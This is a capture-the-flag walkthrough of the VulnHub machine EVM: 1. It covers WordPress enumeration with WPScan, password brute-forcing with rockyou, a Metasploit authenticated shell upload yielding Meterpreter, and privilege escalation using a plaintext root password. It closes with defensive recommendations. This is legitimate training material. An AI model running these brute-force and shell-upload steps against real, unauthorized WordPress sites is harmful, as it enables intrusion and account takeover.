# EVM: 1 (VulnHub)

## Overview

**EVM: 1 (Extremely Vulnerable Machine)** is an Easy-level VulnHub machine designed to teach web application penetration testing through WordPress exploitation. The machine demonstrates the complete attack chain from network discovery and WordPress enumeration to credential brute-forcing, authenticated remote code execution, and Linux privilege escalation.

This lab provides practical experience with reconnaissance, WordPress security assessment, Metasploit exploitation, post-exploitation, and privilege escalation techniques.

## Machine Information

| Attribute | Value |
|------------|---------|
| Machine Name | EVM: 1 (Extremely Vulnerable Machine) |
| Platform | VulnHub |
| Difficulty | Easy |
| Target OS | Ubuntu Linux |
| Attacker Machine | Kali Linux |
| Main Vector | Vulnerable WordPress + Weak Credentials |
| Objective | Gain Root Access and Retrieve the Proof File |

## Skills Demonstrated

- Network Discovery
- Host Enumeration
- Service Enumeration
- Nmap Scanning
- Web Enumeration
- Directory Enumeration
- WordPress Enumeration
- WPScan
- Credential Brute Force
- WordPress Exploitation
- Metasploit Framework
- Authenticated Remote Code Execution
- Meterpreter
- Linux Enumeration
- TTY Upgrade
- Privilege Escalation
- Post Exploitation

## Tools Used

- arp-scan
- Nmap
- DIRB
- WPScan
- Metasploit Framework
- Meterpreter
- Python
- Bash
- Linux Commands
- Kali Linux

## Attack Methodology

1. Discover the target machine.
2. Enumerate running services.
3. Analyze the web application.
4. Perform directory brute-forcing.
5. Enumerate the WordPress installation.
6. Discover valid usernames.
7. Brute-force WordPress credentials.
8. Authenticate to WordPress.
9. Exploit authenticated file upload using Metasploit.
10. Obtain a Meterpreter session.
11. Enumerate sensitive files.
12. Discover stored root credentials.
13. Upgrade to an interactive shell.
14. Escalate privileges using `su`.
15. Retrieve the root proof file.

## Network Discovery

Identify the target machine.

```bash
sudo arp-scan -l
```

Result:

```text
192.168.1.109
```

The vulnerable machine was successfully discovered on the local network.

## Service Enumeration

Perform service and OS detection.

```bash
sudo nmap -A -sV -sC 192.168.1.109 --min-rate 10000
```

### Open Ports

| Port | Service | Version |
|------|----------|---------|
| 22 | SSH | OpenSSH 7.2p2 |
| 53 | DNS | ISC BIND 9.10.3 |
| 80 | HTTP | Apache 2.4.18 |
| 110 | POP3 | Dovecot |
| 139 | SMB | Samba |
| 143 | IMAP | Dovecot |
| 445 | SMB | Samba 4.3.11 |

The scan identified a vulnerable Ubuntu server hosting WordPress, Samba, mail services, and SSH.

## Web Enumeration

Browse to:

```text
http://192.168.1.109
```

The default Apache page revealed a hidden hint pointing to:

```text
/wordpress/
```

This indicated the presence of a vulnerable WordPress installation.

## Directory Enumeration

Enumerate directories using DIRB.

```bash
dirb http://192.168.1.109/
```

Interesting findings:

```text
/index.html
/info.php
/server-status
/wordpress/
/wordpress/wp-admin/
/wordpress/wp-content/
/wordpress/wp-includes/
/wordpress/xmlrpc.php
```

Several directories were publicly accessible due to directory listing being enabled.

## WordPress Enumeration

Enumerate WordPress using WPScan.

```bash
wpscan --url http://192.168.1.109/wordpress/ -e at -e ap -e u
```

### Findings

- WordPress Version 5.2.4
- XML-RPC Enabled
- Upload Directory Listing Enabled
- Username Discovered:

```text
c0rrupt3d_brain
```

## Credential Brute Force

Attempt password discovery.

```bash
wpscan --url http://192.168.1.109/wordpress/ -U c0rrupt3d_brain -P /usr/share/wordlists/rockyou.txt
```

Successful credentials:

```text
Username: c0rrupt3d_brain
Password: 24992499
```

Valid administrator credentials were successfully obtained.

## Initial Access

Use Metasploit to gain authenticated remote code execution.

```bash
msfconsole
```

Search module:

```text
wp_admin_shell_upload
```

Configure:

```text
use exploit/unix/webapp/wp_admin_shell_upload

set RHOSTS 192.168.1.109
set USERNAME c0rrupt3d_brain
set PASSWORD 24992499
set TARGETURI /wordpress
set LHOST <Your-IP>
set LPORT 4444

exploit
```

Result:

```text
Meterpreter session opened.
```

A Meterpreter session was successfully established as **www-data**.

## Post Exploitation

Enumerate the home directory.

```bash
cd /home
ls
```

Interesting user:

```text
root3r
```

Inside the user's home directory an interesting file was found.

```text
.root_password_ssh.txt
```

Read the file.

```bash
cat .root_password_ssh.txt
```

Recovered credential:

```text
willy26
```

The file contained the root password in plaintext.

## TTY Upgrade

Spawn an interactive shell.

```bash
shell

python -c 'import pty; pty.spawn("/bin/bash")'
```

A fully interactive Linux shell was obtained.

## Privilege Escalation

Use the recovered root password.

```bash
su root
```

Password:

```text
willy26
```

Verify access.

```bash
whoami
id
```

Output:

```text
root
uid=0(root)
```

Full administrative privileges were successfully obtained.

## Root Flag

Navigate to the root directory.

```bash
cd /root
cat proof.txt
```

Output:

```text
voila you have successfully pwned me :) !!!

:D

123
```

## Vulnerabilities Identified

### 1. Outdated WordPress

The server was running WordPress 5.2.4 containing known vulnerabilities.

### 2. Weak Password Policy

The administrator password was successfully brute-forced using a common password list.

### 3. XML-RPC Enabled

XML-RPC exposed additional attack surface for authentication attacks.

### 4. Directory Listing Enabled

Sensitive directories were publicly accessible.

### 5. Authenticated File Upload

WordPress administrator access allowed arbitrary PHP payload uploads.

### 6. Plaintext Root Password

The root password was stored in a readable text file.

### 7. Improper Privilege Management

Sensitive credentials were accessible to a compromised low-privileged account.

## Attack Chain Summary

- Network Discovery using arp-scan
- Service Enumeration using Nmap
- Web Enumeration
- Directory Enumeration using DIRB
- WordPress Enumeration using WPScan
- Username Discovery
- Password Brute Force
- WordPress Authentication
- Authenticated PHP Shell Upload
- Meterpreter Session
- Post Exploitation
- Root Password Discovery
- TTY Upgrade
- Privilege Escalation using su
- Root Flag Retrieval

## Security Recommendations

- Keep WordPress core, plugins, and themes updated.
- Enforce strong password policies.
- Enable account lockout after repeated failed logins.
- Disable XML-RPC if unnecessary.
- Disable directory listing on Apache.
- Restrict WordPress administrator access.
- Never store plaintext passwords.
- Implement secrets management solutions.
- Monitor authentication attempts.
- Regularly perform vulnerability assessments and penetration testing.

## Key Learning Outcomes

- Enumeration reveals valuable attack vectors.
- WordPress security misconfigurations significantly increase risk.
- Weak passwords remain one of the easiest compromise methods.
- Authenticated file upload vulnerabilities often lead to remote code execution.
- Proper post-exploitation enumeration uncovers privilege escalation paths.
- Plaintext credential storage can completely compromise a system.
- Defense-in-depth is essential to prevent chained attacks.

## Flag

```text
voila you have successfully pwned me :) !!!

:D

123
```

## Conclusion

EVM: 1 is an excellent beginner-friendly VulnHub machine that demonstrates a complete WordPress penetration testing workflow. It covers network reconnaissance, WordPress enumeration, credential attacks, authenticated exploitation using Metasploit, Linux post-exploitation, and privilege escalation through insecure credential storage. The lab highlights how multiple common misconfigurations can be chained together to achieve complete system compromise.

---

**Author:** Omkar Babaji Sawant

**Repository:** VulnHub-Walkthroughs
